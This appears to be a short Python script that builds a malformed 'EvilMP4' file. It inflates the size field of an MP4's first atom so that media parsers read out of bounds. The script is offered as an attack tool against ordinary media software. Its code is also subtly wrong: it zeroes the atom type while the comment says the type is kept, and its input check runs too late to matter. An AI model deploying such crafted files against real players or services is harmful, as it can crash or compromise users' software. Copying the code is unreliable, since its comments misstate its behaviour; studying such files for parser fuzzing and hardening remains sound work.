from construct import Struct, Int32ub, GreedyBytes, Tell, Seek, Padding
import os

subs =int(input("how many loops over: "))

def manipulate_mp4(input_file, output_file):
    # Define a structure for an MP4 atom (simplified version)
    Atom = Struct(
        "start" / Tell,
        "size" / Int32ub,
        "type" / Padding(4),  # skip 4 bytes for the type
        "data" / GreedyBytes
    )

    with open(input_file, 'rb') as f:
        data = f.read()

    # Parse the first atom (usually 'ftyp' atom)
    parsed = Atom.parse(data)

    # Modify the size to be larger than the actual data, simulating a bad size that leads out-of-bounds
    oversized_size = parsed.size + 1024 * subs # Increase the size to create a potentially malformed situation

    # Rebuild the atom with the incorrect size
    malformed_atom = Atom.build(dict(
        size=oversized_size,
        type=b"",  # Keep original type as is (assuming 'ftyp' or the first parsed type)
        data=parsed.data
    ))

    # Replace the first atom in the file with the malformed one
    with open(output_file, 'wb') as out:
        out.write(malformed_atom)
        out.write(data[len(malformed_atom):])  # Write the rest of the original file

if subs == "" or subs == 0:
        subs = 1

# Usage
manipulate_mp4(input("Enter your MP4 file: "), input("Enter your EvilMP4 name: "))
